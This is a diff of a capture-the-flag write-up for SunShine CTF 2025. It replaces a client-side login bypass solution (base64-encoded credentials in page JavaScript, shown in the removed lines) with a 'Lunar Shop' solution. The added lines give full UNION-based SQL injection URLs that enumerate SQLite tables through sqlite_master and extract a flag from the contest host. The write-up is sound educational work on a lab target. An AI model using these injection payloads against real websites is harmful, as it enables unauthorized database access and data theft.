@@ -2,7 +2,7 @@
 date = '2025-10-06T17:50:57+07:00'
 title = 'SunShine CTF 2025 - Lunar Shop Write-up'
 tags = ['SunShine CTF 2025', 'CTFs']
-description = 'We have amazing new products for our gaming service! Unfortunately we don't sell our unreleased flag product yet !'
+description = 'We have amazing new products for our gaming service! Unfortunately we dont sell our unreleased flag product yet !'
 draft = false
 
 [cover]
@@ -24,83 +24,62 @@ draft = false
 -   **Target / URL:** `https://meteor.sunshinectf.games`
 -   **Difficulty:** `Easy`
 -   **Points:** `10`
--   **Date:** `06-10-2025`
+-   **Date:** `30-09-2025`
 
 ---
 
 ## Goal
 
-We have to get the flag by bypass the admin authentication.
+We have to get the flag by using a vulnerability in the query of product id.
 
 ## My Solution
 
-This is the home page, there aren't any useful information.
+There are just 3 routes we can gather information in this website: `/`, `/products`, `/product?product_id`.
 
-![Guide image](/images/posts/lunar-auth-1.png)
+Home page:
+![Guide image](/images/posts/lunar-shop-1.png)
 
-Try access `https://comet.sunshinectf.games/robots.txt`, the content is:
+Products page:
+![Guide image](/images/posts/lunar-shop-2.png)
+
+Product item details page:
+![Guide image](/images/posts/lunar-shop-3.png)
+
+There are just 3 visible products, we can try give different `product_id`.
+
+Initially, I think that the flag is in other invisible `product_id`. However, there are just 10 products from id 1 -> 10.
+
+So I think of another solution, which is **SQL Injection**. Firstly I test with this url: `https://meteor.sunshinectf.games/product?product_id=-1%20UNION%20SELECT%20%27A%27,%20%27B%27,%20%27C%27,%20%27sun{FLAG}%27%20--`
+
+![Guide image](/images/posts/lunar-shop-4.png)
+
+Try `https://meteor.sunshinectf.games/product?product_id=-1%20UNION%20SELECT%201,%202,%203,%20group_concat(table_name)%20FROM%20information_schema.tables%20WHERE%20table_schema=DATABASE()` to find the tables in the database.
+
+However, I receive this error:
 
 ```
-# tired of these annoying search engine bots scraping the admin panel page logins:
-
-Disallow: /admin
+[ Error occured. --> no such table: information_schema.tables ]
 ```
 
-This is the content of `/admin`, there is a login form, we have to bypass this to get access as admin.
+This message indicate that the database is **SQLite**.
 
-![Guide image](/images/posts/lunar-auth-2.png)
+Try `https://meteor.sunshinectf.games/product?product_id=-1%20UNION%20SELECT%201,%202,%203,%20group_concat(tbl_name)%20FROM%20sqlite_master%20WHERE%20type='table'%20--`. Receive:
 
-Click **View page source** this page, we can easily see a `<script>` tag
-
-![Guide image](/images/posts/lunar-auth-3.png)
-
-```html
-<script>
-    /*
-    To reduce load on our servers from the recent space DDOS-ers we have lowered login attempts by using Base64 encoded encryption
-    ("encryption" 💀) on the client side.
-    
-    TODO: implement proper encryption.
-    */
-    const real_username = atob('YWxpbXVoYW1tYWRzZWN1cmVk');
-    const real_passwd = atob('UzNjdXI0X1BAJCR3MFJEIQ==');
-
-    document.addEventListener('DOMContentLoaded', () => {
-        const form = document.querySelector('form');
-
-        function handleSubmit(evt) {
-            evt.preventDefault();
-
-            const username = form.elements['username'].value;
-            const password = form.elements['password'].value;
-
-            if (username === real_username && password === real_passwd) {
-                // remove this handler and allow form submission
-                form.removeEventListener('submit', handleSubmit);
-                form.submit();
-            } else {
-                alert('[ Invalid credentials ]');
-            }
-        }
-
-        form.addEventListener('submit', handleSubmit);
-    });
-</script>
+```
+products,sqlite_sequence,flag
 ```
 
-The username and password is defined like this:
+Get table structure: `https://meteor.sunshinectf.games/product?product_id=-1%20UNION%20SELECT%201,%202,%203,%20sql%20FROM%20sqlite_master%20WHERE%20type='table'%20AND%20tbl_name='flag'%20--`
+Receive:
 
-```javascript
-const real_username = atob('YWxpbXVoYW1tYWRzZWN1cmVk');
-const real_passwd = atob('UzNjdXI0X1BAJCR3MFJEIQ==');
+```
+CREATE TABLE flag ( id INTEGER PRIMARY KEY AUTOINCREMENT, flag TEXT NOT NULL UNIQUE )
 ```
 
-We can retrieve these two variables through `Console` tab of `Dev Tools`.
+Final query to get the flag: `https://meteor.sunshinectf.games/product?product_id=-1%20UNION%20SELECT%201,%202,%203,%20flag%20FROM%20flag%20--`. Receive:
 
-![Guide image](/images/posts/lunar-auth-4.png)
+![Guide image](/images/posts/lunar-shop-5.png)
 
-This is a known problem of **Global Variable** in Javascript, it should be in a function and cannot be access by users.
-
-![Guide image](/images/posts/lunar-auth-5.png)
-
-Flag is: `sun{cl1ent_s1d3_auth_1s_N3V3R_a_g00d_1d3A_983765367890393232}`
+```
+sun{baby_SQL_injection_this_is_known_as_error_based_SQL_injection_8767289082762892}
+```
